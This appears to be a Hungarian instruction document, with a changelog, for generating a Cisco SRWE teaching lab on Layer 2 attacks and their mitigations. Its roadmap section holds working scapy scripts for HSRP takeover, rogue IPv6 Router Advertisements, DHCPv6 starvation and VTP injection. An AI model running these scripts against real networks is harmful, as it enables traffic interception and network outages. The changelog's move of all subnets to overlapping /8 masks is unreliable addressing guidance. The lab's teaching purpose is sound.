# AI-Instrukció: SRWE M10–11 Laborfeladat Automatizált Előállítása

*Dokumentum-verzió: v3.0 | Utolsó frissítés: 2026-11-19*

## RÉSZ 0 — KIEGÉSZÍTŐ TÁMADÁSI JAVASLATOK (bővítési roadmap)

> Ez a szekció a jelenlegi **12 fázist** egészíti ki olyan Layer 2 (és L2+/L3-határ) támadásokkal, amelyek **nincsenek** a mai laborban, de valódi Cisco IOS környezetben reprodukálhatók (scapy- vagy CLI-alapon), és mindegyikhez létezik konkrét Cisco mitigation. A cél, hogy a csomag a következő iterációkban (13–16. fázis) fokozatosan, prioritási sorrendben bővüljön. Minden javasolt támadáshoz tartozik egy `mitigations.yml`-szekciónév, nehézségi fok (1–5) és prioritás (1 = legfontosabb, mert leginkább hiányzik és legmagasabb oktatási/biztonsági értékű). A prioritás a labor-relevancia + hiány + Cisco IOS támogatottság hármasából áll össze.

### 0.1 Új támadások értékelő táblázata

| #  | Támadás neve | Réteg | Eszközök | Cisco IOS mitigation (konkrét parancsok) | mitigations.yml szekció | Nehézség (1–5) | Prioritás (1–12) |
| -- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |
| 1  | HSRP/VRRP/GLBP eltérítés (FHRP takeover) | L2+/L3 | scapy (HSRP hello, prio 255) | `standby 1 authentication md5 key-string <kulcs>`; `standby 1 priority 110`; `standby 1 preempt` | `fhrp-authentication` | 3 | 1 |
| 2  | IPv6 Router Advertisement spoofing (rogue RA → IPv6 MITM) | L2+ | scapy (`ICMPv6ND_RA`) | `ipv6 nd raguard policy HOST` + `device-role host`; `ipv6 nd raguard attach-policy HOST` az access portokon | `ipv6-ra-guard` | 2 | 2 |
| 3  | DHCPv6 starvation/spoofing (IPv6 változat) | L2+ | scapy (`DHCP6_Solicit`/`DHCP6_Advertise`) | `ipv6 dhcp guard policy SRV` + `device-role server`; `ipv6 dhcp guard attach-policy` a trust portokon, kliensportokon tiltás | `dhcpv6-guard` | 3 | 3 |
| 4  | VTP injection (VLAN-tábla felülírás) | L2 | scapy (VTP summary/subset, magasabb rev. szám) | `vtp mode transparent` VAGY `vtp password <jelszó>`; `vtp version 3` + `vtp primary` | `vtp-hardening` | 3 | 4 |
| 5  | IPv6 NDP poisoning (ARP-ekvivalens, NA spoof) | L2+ | scapy (`ICMPv6ND_NA` override) | `ipv6 nd inspection policy`; `ipv6 nd inspection attach-policy`; `device-tracking policy` + binding | `ipv6-nd-inspection` | 3 | 5 |
| 6  | Rogue STP BPDU injection port-lopásra (port-theft, nem root-takeover) | L2 | scapy (`STP` inferior/kevert BPDU) | `spanning-tree portfast`; `spanning-tree bpduguard enable` (access); `spanning-tree guard root` (uplink) | `stp-bpduguard` | 3 | 6 |
| 7  | EtherChannel/LACP negotiation attack (jogosulatlan trunk) | L2 | scapy (LACP LACPDU injektálás) | `channel-group x mode on` (no negotiation) VAGY access portokon `channel-protocol` tiltás; `switchport nonegotiate` | `etherchannel-guard` | 4 | 7 |
| 8  | Private VLAN escape (secondary→primary átugrás) | L2 | scapy/CLI (proxy-cím + router-MAC célzás) | PACL a primary SVI-n: `ip access-list` + `access-map`; `switchport protected`; L3-szűrés a gateway-en | `pvlan-protection` | 4 | 8 |
| 9  | 802.1X bypass / EAP relay (NAC megkerülés) | L2 | hostapd/EAP relay, scapy (EAPOL) | `dot1x system-auth-control`; `authentication host-mode single-host`; `dot1x pae authenticator`; MACsec (`macsec`) | `dot1x-hardening` | 5 | 9 |
| 10 | SNMP community string exploitation (L2 pozícióból) | L2+ | `snmpwalk`/scapy (SNMP get/set) | `no snmp-server community public`; `snmp-server group ... v3 priv`; `snmp-server user ... v3 auth sha priv aes`; ACL a community-n | `snmp-hardening` | 2 | 10 |
| 11 | Broadcast/multicast storm (storm-control bypass) | L2 | scapy (broadcast flood) | `storm-control broadcast level 1.00`; `storm-control multicast level 1.00`; `storm-control action shutdown` | `storm-control` | 2 | 11 |
| 12 | CDP table exhaustion (CDP tábla-túlcsordulás) | L2 | scapy (sok hamis `CDPv2` szomszéd) | `no cdp run` (globális) VAGY `no cdp enable` (access port); CPU-védelem CoPP-pel | `cdp-hardening` | 2 | 12 |

> **Megvalósíthatósági megjegyzés:** a scapy natívan támogatja az STP, LACP, CDP, HSRP, VTP, EAPOL és a teljes ICMPv6/DHCPv6 réteget (`scapy.contrib` modulok: `ospf`, `lacp`, `vtp`, `cdp`; az IPv6/HSRP a core-ban). A `scapy.contrib.lacp` és `scapy.contrib.cdp` importot igényelhet (`from scapy.contrib.lacp import *`). A 802.1X/EAP relay a legösszetettebb (élő RADIUS-backend és egy második NIC kell hozzá), ezért kapta az 5-ös nehézséget.

### 0.2 Ajánlott felvételi sorrend (következő 13–16. fázis)

A prioritási táblázat alapján a **legközelebbi bővítés 4 fázissal** ajánlott, mert ezek fedik le a legnagyobb hiányt a legkisebb infrastruktúra-többlettel, és közvetlenül illeszkednek az SRWE M10–11 tananyag FHRP- és IPv6-biztonsági témáihoz:

| Új fázis | Támadás | Indoklás |
| -- | ---- | ---- |
| **13.** | HSRP/VRRP/GLBP eltérítés | Klasszikus gateway-MITM, közvetlenül bővíti a 12. fázis (ICMP redirect) gateway-témáját; csak R1-konfig kell. |
| **14.** | IPv6 RA spoofing (rogue RA) | A labor jelenleg tisztán IPv4; az IPv6 MITM a legnagyobb lefedettségi hiány, és az RA Guard egyszerűen demózható. |
| **15.** | DHCPv6 starvation/spoofing | Logikusan a 14. fázis után (IPv6 kontextus már felépítve); a DHCPv6 Guard a DHCP snooping IPv6-megfelelője. |
| **16.** | VTP injection | Tiszta L2, látványos (teljes VLAN-adatbázis törölhető egyetlen kerettel); `vtp mode transparent` triviális, de tanulságos védelem. |

**Sorrendfüggőség:** a 15. fázis (DHCPv6) kötelezően a 14. (IPv6 RA) UTÁN jöjjön, mert az IPv6-cím/kontextus felépítése az RA-fázisban történik. A 13. és 16. fázis egymástól független, bárhova beilleszthető.

### 0.3 Javasolt új fázisok — leírás + scapy vázak

#### 13. fázis — HSRP eltérítés (FHRP takeover)
A támadó 255-ös prioritású HSRP Hello-kat küld a virtuális IP-re, átveszi az Active szerepet, így az alapértelmezett gateway forgalma rajta megy keresztül (MITM). Védelem: MD5/kulcs-authentikáció a `standby` csoporton.

```python
#!/usr/bin/env python3
"""HSRP takeover: maximális (255) prioritású Hello-val átveszi az Active gateway-t.
Futtatás: sudo python hsrp_hijack.py eth0 10.10.10.1 10.10.10.254
    argv1=iface, argv2=virtuális IP (VIP), argv3=támadó valós IP
"""
import sys
from scapy.all import Ether, IP, UDP, sendp, conf
from scapy.contrib.hsrp import HSRP

def main():
    iface, vip, atk_ip = sys.argv[1], sys.argv[2], sys.argv[3]
    conf.iface = iface
    # HSRP v1: UDP/1985, multicast 224.0.0.2, prio=255, Coup/Hello state
    pkt = (Ether(dst="01:00:5e:00:00:02") /
           IP(src=atk_ip, dst="224.0.0.2", ttl=1) /
           UDP(sport=1985, dport=1985) /
           HSRP(group=1, priority=255, virtualIP=vip, state=16,  # 16=Active
                auth="cisco"))
    print(f"[*] HSRP takeover indul (VIP={vip}, prio=255)...")
    sendp(pkt, loop=1, inter=1, iface=iface, verbose=0)  # Ctrl+C-ig

if __name__ == "__main__":
    main()
```

#### 14. fázis — IPv6 RA spoofing (rogue Router Advertisement)
A támadó hamis RA-kat szór, saját magát hirdeti IPv6 default routerként (és/vagy DNS-ként), így a kliensek rajta keresztül építik fel az IPv6 alapértelmezett útvonalat → IPv6 MITM. Védelem: `ipv6 nd raguard` az access portokon (csak a valódi router portja lehet `device-role router`).

```python
#!/usr/bin/env python3
"""Rogue IPv6 Router Advertisement: a támadót hirdeti default IPv6 gateway-ként.
Futtatás: sudo python ipv6_ra_spoof.py eth0
"""
import sys
from scapy.all import Ether, IPv6, sendp, conf
from scapy.all import (ICMPv6ND_RA, ICMPv6NDOptSrcLLAddr,
                       ICMPv6NDOptPrefixInfo)

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    conf.iface = iface
    atk_mac = conf.iface.mac if hasattr(conf.iface, "mac") else "02:11:22:33:44:55"
    ra = (Ether(src=atk_mac, dst="33:33:00:00:00:01") /
          IPv6(src="fe80::bad:c0de", dst="ff02::1") /
          ICMPv6ND_RA(routerlifetime=1800, prf=1) /          # prf=1: high preference
          ICMPv6NDOptSrcLLAddr(lladdr=atk_mac) /
          ICMPv6NDOptPrefixInfo(prefix="2001:db8:bad::", prefixlen=64,
                                validlifetime=1800, preferredlifetime=1800))
    print("[*] Rogue RA szórás indul (prf=high)...")
    sendp(ra, loop=1, inter=3, iface=iface, verbose=0)  # Ctrl+C-ig

if __name__ == "__main__":
    main()
```

#### 15. fázis — DHCPv6 starvation/spoofing
Két változat: (a) *starvation* — tömeges `Solicit` különböző DUID-okkal kimeríti a DHCPv6 poolt; (b) *spoofing* — hamis `Advertise`/`Reply` küldése (rogue DHCPv6 szerver), amivel a támadó DNS-t/paramétereket osztogat. Védelem: `ipv6 dhcp guard` — csak a trust portokon engedélyezett szerver-válasz.

```python
#!/usr/bin/env python3
"""DHCPv6 starvation: sok véletlen DUID-dal Solicit-ot küld, kimeríti a poolt.
Futtatás: sudo python dhcpv6_starve.py eth0 5000
"""
import sys, random
from scapy.all import Ether, IPv6, UDP, sendp, conf
from scapy.all import (DHCP6_Solicit, DHCP6OptClientId, DUID_LLT,
                       DHCP6OptIA_NA)

def rand_duid():
    mac = "02:%02x:%02x:%02x:%02x:%02x" % tuple(random.getrandbits(8) for _ in range(5))
    return DUID_LLT(lladdr=mac)

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    count = int(sys.argv[2]) if len(sys.argv) > 2 else 5000
    conf.iface = iface
    print(f"[*] DHCPv6 starvation: {count} Solicit a(z) {iface}-n...")
    for i in range(count):
        pkt = (Ether(dst="33:33:00:01:00:02") /
               IPv6(dst="ff02::1:2") /              # All_DHCP_Relay_Agents_and_Servers
               UDP(sport=546, dport=547) /
               DHCP6_Solicit(trid=random.randint(0, 0xffffff)) /
               DHCP6OptClientId(duid=rand_duid()) /
               DHCP6OptIA_NA(iaid=random.randint(0, 0xffffffff)))
        sendp(pkt, verbose=0)
        if i % 500 == 0:
            print(f"[+] elküldve: {i}")
    print("[!] Kész. Nézd a DHCPv6 pool kihasználtságát R1-en.")

if __name__ == "__main__":
    main()
```

#### 16. fázis — VTP injection (VLAN-adatbázis felülírás)
A támadó egy a jelenleginél **magasabb revíziószámú** VTP subset-advertisementet injektál a trunkre; a VTP domainben lévő switchek elfogadják és felülírják a VLAN-adatbázisukat (akár az összes VLAN törlése). Védelem: `vtp mode transparent` (nem vesz részt a szinkronban) vagy `vtp password`, illetve VTPv3 + `vtp primary`.

```python
#!/usr/bin/env python3
"""VTP injection váz: magas revíziószámú VTP subset advertisement a trunkön.
MEGJEGYZÉS: trunk-portra kötött attacker és egyező VTP-domain kell hozzá.
Futtatás: sudo python vtp_inject.py eth0 LABDOMAIN 999
"""
import sys
from scapy.all import Ether, Dot3, LLC, SNAP, sendp, conf
from scapy.contrib.vtp import VTP, VTPSummaryAdvertisement  # scapy.contrib

def main():
    iface = sys.argv[1] if len(sys.argv) > 1 else "eth0"
    domain = sys.argv[2] if len(sys.argv) > 2 else "LABDOMAIN"
    rev = int(sys.argv[3]) if len(sys.argv) > 3 else 999
    conf.iface = iface
    # VTP a 802.3/SNAP keretben megy (OUI 00000c, code 2003), dst 01:00:0c:cc:cc:cc
    pkt = (Dot3(dst="01:00:0c:cc:cc:cc", src=conf.iface.mac) /
           LLC(dsap=0xaa, ssap=0xaa, ctrl=3) /
           SNAP(OUI=0x00000c, code=0x2003) /
           VTP(domain=domain, rev=rev))   # magas rev → a switchek átveszik
    print(f"[*] VTP injection (domain={domain}, rev={rev})...")
    sendp(pkt, iface=iface, verbose=0)
    print("[!] Kész. Ellenőrzés: 'show vtp status' + 'show vlan brief' a switcheken.")

if __name__ == "__main__":
    main()
```

> **Figyelem (laborbiztonság):** a 13–16. fázis újratámadás-része is a „támadás → megfigyelés → védelem → újratámadás (elhiúsul)" mintát kövesse. A VTP injection különösen destruktív (teljes VLAN-adatbázist törölhet) — csak izolált laborban, konfigmentés után futtatható.

---

## Reprodukciós szempontok

> Cél: egy AI-asszisztens (vagy fejlesztő) a semmiből reprodukálja a teljes labort az alábbi instrukció alapján.

---

## RÉSZ 1 — REPRODUKCIÓS INSTRUKCIÓ (generáláshoz)

### 1.1 Kontextus megadása az AI-nak

```
Feladat: Készíts egy teljes hallgatói laboranyag-csomagot a Cisco NetAcad
"Switching, Routing and Wireless Essentials" (SRWE) v7.0 Modul 10 (LAN
Security Concepts) és Modul 11 (Switch Security Configuration) tananyaghoz.

Követelmények:
- FIZIKAI eszközök (2× Cisco switch, 1× router, 3× Linux PC)
- A TÁMADÓ kliens PYTHON kódot futtat (scapy), nem kész eszközöket
- A CISCO konfiguráció YAML-fájlban van definiálva, és Python (netmiko)
  tölti fel az eszközökre
- 12 különböző L2-támadás, mindegyikhez a hozzá tartozó védelem
- Fázisonkénti menet: támadás → megfigyelés → védelem felkonfigurálása →
  újratámadás (el kell hiúsulnia)
- Magyar nyelvű, jól formázott Markdown dokumentáció
```

### 1.2 Kötelező fázislista (12 támadás, fix sorrend)

| Fázis | Támadás                                | Védelem (YAML-szekció)         |
| ----- | -------------------------------------- | ------------------------------ |
| 1     | MAC address table overflow (CAM flood) | `port-security`                |
| 2     | MAC spoofing                           | `port-security` (sticky)       |
| 3     | DHCP starvation                        | `dhcp-snooping` (+ rate limit) |
| 4     | DHCP spoofing (rogue DHCP)             | `dhcp-snooping` (trust)        |
| 5     | ARP poisoning (kétirányú MITM)         | `dai`                          |
| 6     | STP manipulation (root takeover)       | `stp-guard`                    |
| 7     | VLAN hopping (DTP)                     | `vlan-hop`                     |
| 8     | CDP recon + nyílt Telnet               | `hardening`                    |
| 9     | 802.1Q double-tagging                  | `native-vlan-hardening`        |
| 10    | IP spoofing                            | `ip-source-guard`              |
| 11    | LLDP recon (+ hamis LLDPDU injektálás) | `lldp-hardening`               |
| 12    | ICMP redirect (gateway MITM)           | `icmp-redirect`                |

**Sorrendfüggőség:** a 10. fázis (IPSG) kötelezően a 3–4. (DHCP snooping) UTÁN kell hogy fusson, mert a binding-tábla nélkül az IPSG minden userforgalmat eldob.

### 1.3 Kötelező fájllista

```
srwe-lab/
├── inventory.yml          (S1, S2, R1 — hálózati paraméterek)
├── configs/baseline.yml   (VÉDTelen, de elérhető állapot; ssh+TELNET, cdp be, ip redirects be)
├── configs/mitigations.yml (12 szekció, post-show-parancsokkal)
├── push_config.py         (netmiko YAML→Cisco pusher)
├── verify.py              (27 regex-ellenőrzés, Pipa/Hiba, JSON-kimenet — nem ad jegyet és nem pontoz)
├── attacker/*.py          (12 scapy szkript, mindegyik root-ként fut)
├── feladatlap.md          (hallgatói munkalap, 12 fázis kitöltendő)
└── reflexios_lap.md       (protokoll/adatvédelmi reflexió, rubrikával)
```

### 1.4 Technikai kötöttségek

- **Attacker szkriptek:** scapy, `sudo`, sudóként futtathatók, véletlenszerű MAC-generálás, `[...] hogyan kell meghívni` docstringgel
- **Pusher:** netmiko `ConnectHandler`, `send_config_set`, `save_config`; az `interface`/`interface range` kulcsok felismerése; a konténerparancsok (vlan, pool, line) után automatikus `exit`
- **Verify:** show-parancs kimenet ellenőrzése reguláris kifejezésekkel; pozitív (KELL) és negatív (NEM SZABAD) minták; `--verbose`, `--json`, `--only` opciók; Pipa/Hiba kimenet + exit kód (0, ha minden átment) — **nem ad jegyet és nem pontoz**
- **Baseline követelmény:** sebezhető (nincs egy védelem sem), DE elérhető (SSH+Telnet menedzsmenten, CDP fut, `ip redirects` bekapcsolva)
- **Reflexiós lap követelménye:** MITM-elemzés HTTP/HTTPS(SNI, stripping, rogue CA)/DNS(DNSSEC vs DoH/DoT)/SNMP/NTP és más protokollok felett; GDPR-elvpárosítás; dilemmakérdések (TLS-interceptió, DoH-központosítás)

---

*Dokumentum-verzió: v3.0 | Utolsó frissítés: 2026-11-19*

---

## VÁLTOZÁSNAPLÓ

> Munkamenetre vonatkozó változásnapló. Minden módosítás timestamp-pel (ÉÉÉÉ-HH-NN).

- **2026-11-19:** **SSH kex-kompatibilitás rögzítve + teljes /8 címzés.** (1) **SSH-fix a repóba:** az R1 régi IOS-a csak SHA-1 kex-et ajánl (`diffie-hellman-group-exchange-sha1/group14-sha1/group1-sha1`), amit a paramiko ≥5.x már nem fogad el — `requirements.txt`-ben rögzítve a `paramiko>=3.5,<5` verzió; a README-be új „SSH kompatibilitás (R1, régi IOS)" szakasz (paramiko-pin magyarázat + `~/.ssh/config` blokk a rendszer-ssh-hoz: `KexAlgorithms/HostKeyAlgorithms/PubkeyAcceptedAlgorithms +…sha1/+ssh-rsa`); a deploy-checklist hibakereső táblázatába új sor az `Incompatible ssh peer (no acceptable kex algorithm)` hibához. (2) **Teljes hálózat /24 → /8:** minden alhálózat /8-as maszkkal fut (`10.0.99.0/8`, `10.10.10.0/8`, `10.20.20.0/8`) — frissítve: `configs/baseline.yml` (SVI-k, R1 subinterface-ek, DHCP-pool `network … 255.0.0.0`), `inventory.yml` (`user_subnet: 10.10.10.0/8`), `attacker/rogue_dhcp.py` (OFFER `subnet_mask` 255.0.0.0), a könyv §12 Mermaid-ábrája és mindkét IP-címzési táblázata, valamint a deploy-checklist. A verify.py regexei IP-semlegesek (kimenet-struktúrát illesztenek), így nem szorulnak módosításra. Instrukció v3.0-ra frissítve.

- **2026-11-17:** **`push_config.py` hiba javítva + egységes `python` parancs.** (1) A `push_config.py` eddig csak a **szekciós** `mitigations.yml`-t (szekció → eszköz → konfig) kezelte; a **lapos** `baseline.yml`-re (eszköz → konfig, top-level S1/S2/R1) `KeyError: 'global'`-lal elszállt (traceback a 95→85→26 sorokon). Hozzáadva a `CONFIG_KEYS` + `is_device_cfg()` automatikus szerkezet-felismerés és egy inventory-eszköznév őrszem; a `main()` mindkét szerkezetet egységes (szekció, eszköz, konfig) listává normalizálja, a szűrő lapos fájlnál eszköznévre, szekciósnál szekciónévre hat. Egységteszttel ellenőrizve (baseline → S1/S2/R1; mitigations → 19 szekció×eszköz, mind valid; szűrés OK). A könyv §17 beágyazott másolata szinkronizálva a javított fájllal. (2) **Egységes `python` parancs minden rendszeren:** ellenőrizve, hogy a `python` Linuxon is működik; a könyv és az összes doksi (`hallgatoi-feladatlap.md`, `index-es-deploy-checklist.md`, `AI-instrukcio.md`, `verify.py`, `attacker/*.py`, `push_config.py`) parancs-invokációi `python3 …` → `python …`-ra váltva (a shebangok `#!/usr/bin/env python3` és az apt **csomagnevek** érintetlenek). A Linux-telepítőbe bekerült a `python-is-python3` csomag (ez adja a `python` parancsot Ubuntu/Debianon), és a §7 parancsnév-megjegyzés egységesítve; megmaradt a Windows- (MS Store → `py`) és Linux- (`python3 -m venv` egyszeri) tartalék-tipp. Instrukció v2.9-re frissítve.
- **2026-11-17:** **IP-átfedés javítva.** R1-nek korábban két interfésze is a `10.0.99.0/24` (VLAN 99) alhálózatban volt — `Gi0/0` = `.254` és `Gi0/1.99` = `.253` —, amit a valódi Cisco IOS „% overlaps with GigabitEthernet0/0" hibával elutasít. A felesleges `Gi0/0` interfész eltávolítva (`baseline.yml` R1-blokkja és a könyv §15 reprodukciója); a VLAN 99 átjáró ezentúl egyedül a `Gi0/1.99`-en van, **`.254`** címen (ez egyezik a switchek `default-gateway`-ével és az `inventory.yml` R1-host címével) — tiszta router-on-a-stick, egyetlen `Gi0/1` trunkkel. Frissítve a §12 Mermaid-ábra (törölve a `Gi0/0` él és csomópont-sor), az interfész- és VLAN-táblázat, valamint a jelmagyarázat. YAML újravalidálva, Mermaid újrarenderelve. Instrukció v2.8-ra frissítve.
- **2026-11-17:** A könyv **12. fejezetének** (Topológia és címzés) szöveges ASCII-ábrája lecserélve **Mermaid-diagramra** (markdownban/GitHubon renderelhető), amely **minden interfészt** tartalmaz (R1 Gi0/0, Gi0/1 trunk + Gi0/1.10/.20/.99 alinterfészek; S1/S2 SVI + Fa0/1-3, Fa0/24; PC-A/PC-V/ATTACKER/PC-W NIC), VLAN-onkénti csoportosításban, trunk/access/menedzsment kapcsolatok megkülönböztetésével. Hozzáadva két **IP-címzési táblázat** (interfészenkénti + VLAN-összefoglaló) és egy DHCP-megjegyzés; az adatok az `inventory.yml` és a `configs/baseline.yml` alapján. A Mermaid-szintaxis külső rendererrel (mermaid.ink) validálva. **Windows-javítás:** a `python3` Windowson gyakran a Microsoft Store-t nyitja meg, ezért Windowson a `py` indító ajánlott (`py …`, `py -m pip …`, `py -m venv …`); a parancsnév-megjegyzés operációs rendszerenként egyértelműsítve: **`py` = csak Windows**, **`python3`/`pip` = macOS/Linux** (a `py` ott nem létezik). Frissítve a parancsnév-megjegyzés és a 7. fejezet Windows-ellenőrzése. Instrukció v2.7-re frissítve.
- **2026-11-12:** Az instrukciós dokumentumból eltávolítva minden audit-tartalom: a **RÉSZ 2 — ELLENŐRZÉSI PROTOKOLL** és a **RÉSZ 3 — A JELEN CSOMAG AUDIT EREDMÉNYE** szekciók törölve, a lábléc „Audit módszer" része és a bevezető ellenőrzőlista-utalása szintén. A fájl átnevezve `AI-instrukcio.md`-re (a név már nem utal auditra); a README és a könyv hivatkozásai frissítve. A `verify.py` leírása a RÉSZ 1-ben a jegy/pont nélküli (Pipa/Hiba) viselkedésre igazítva. A megmaradt tartalom: RÉSZ 0 (bővítési roadmap), RÉSZ 1 (reprodukciós instrukció), VÁLTOZÁSNAPLÓ. A két forrásdokumentum (`mester-labor-dokumentacio.md`, `vegigvezetes-labor-felallitas.md`) törölve, mert tartalmuk teljesen beolvadt az összevont könyvbe. Instrukció v2.6-ra frissítve.
- **2026-11-10:** A repó mostantól minden labor-fájlt tartalmaz, kézzel semmit nem kell létrehozni. Kinyerve és commitolva: `inventory.yml`, `configs/baseline.yml`, `configs/mitigations.yml`, `push_config.py`, valamint az `attacker/` mappa 12 szkriptje (mac_flood, mac_spoof, dhcp_starve, rogue_dhcp, arp_spoof, stp_takeover, vlan_hop_recon, cdp_telnet_recon, vlan_double_tag, ip_spoof, lldp_recon, icmp_redirect). Új `requirements.txt` (netmiko, pyyaml, scapy); a könyv 10. fejezetében ez az **1. (ajánlott) telepítési opció** (`pip install -r requirements.txt`). A `verify.py` átírva: **nem ad jegyet és nem pontoz**, csak ellenőrzi a beállításokat (Pipa/Hiba/SKIP, kilépési kód 0, ha minden átment); a jegy/pont-táblázat eltávolítva a szkriptből és a könyvből. A könyvben az áldozat gép lehet **Windows is, Wireshark-kal** (nem csak Linux+tcpdump): a IV. rész bevezetőjében és az érintett fázisoknál Wireshark-szűrők (`arp`, `icmp`, `bootp`, `ip.src`) és Windows-parancsok (`ipconfig /release|/renew`, `arp -a`) megadva. A felhasználó kézi markdown-formázási módosításai megőrizve. Instrukció v2.5-re frissítve.
- **2026-11-10:** Összevont könyv hozzáadva: `docs/srwe-labor-konyv.md` — a `vegigvezetes-labor-felallitas.md` és a `mester-labor-dokumentacio.md` egyetlen, lépésről lépésre követhető kézikönyvbe vonva, könyvstruktúrában (I–V. rész, 28 fejezet). Pythonhoz nem feltételez előismeretet: teljes **venv + VSCode** környezetfelállítás nulláról (Windows/macOS/Linux), minden parancs közvetlenül másolható. A README belépési pontja erre mutat; a két forrásdokumentum változatlanul megmarad referenciaként. Instrukció v2.4-re frissítve.
- **2026-11-10:** Új végigvezető kézikönyv hozzáadva: `docs/vegigvezetes-labor-felallitas.md` — mit mire használunk, a labor felállítása (hardver, topológia, szoftver, baseline) és a 12 fázis végigjátszása, pontozás, visszaállítás, hibakeresési gyorslista. A README is hivatkozik rá belépési pontként. Instrukció v2.3-ra frissítve.
- **2026-11-10:** Sallang-eltávolítás az öt markdown dokumentumban — önfényező/motivációs zárlatok és töltelékmondatok törlése, a §3.4 Ítélet tömörítése; minden táblázat, parancs, YAML, kérdés és kitöltendő mező érintetlen. Instrukció v2.2-re frissítve.
  - Index: záró „Jó tanulást!" motivációs bekezdés törölve.
  - AI-instrukció: §3.4 Ítélet terjengős prózája egy mondatra húzva; a PROTOCOL-bevezető töltelékmondata törölve.
  - Reflexiós lap: „Ez a lap magja." töltelékmondat törölve.
  - A munka innentől a privát GitHub repóban (`Elfogadodhe/srwe-lab-10-11`) folytatódik.
- **2026-11-10:** Kiegészítő támadási javaslatok (## RÉSZ 0) hozzáadva; instrukció v2.1-re frissítve.
  - Új, a jelenlegi 12 fázisban NEM szereplő Layer 2 / L2+ támadások értékelő táblázata (12 tétel, 8 oszlop: #, Támadás neve, Réteg, Eszközök, Cisco IOS mitigation, mitigations.yml szekció, Nehézség 1–5, Prioritás 1–12).
  - Ajánlott felvételi sorrend a következő 13–16. fázisra (HSRP eltérítés, IPv6 RA spoofing, DHCPv6 starvation/spoofing, VTP injection) indoklással és sorrendfüggőséggel.
  - Minden javasolt új fázishoz 1–2 mondatos leírás + scapy script-váz (skeleton).
  - Fejléc és lábléc verziószáma v2.0 FINAL → v2.1 (dátum: 2026-11-10).
- **2026-11-05:** v2.0 FINAL — a 12 fázisú csomag teljes manuális auditja (RÉSZ 3), nyelvhelyességi és kódkorrekciós javítások lezárva.
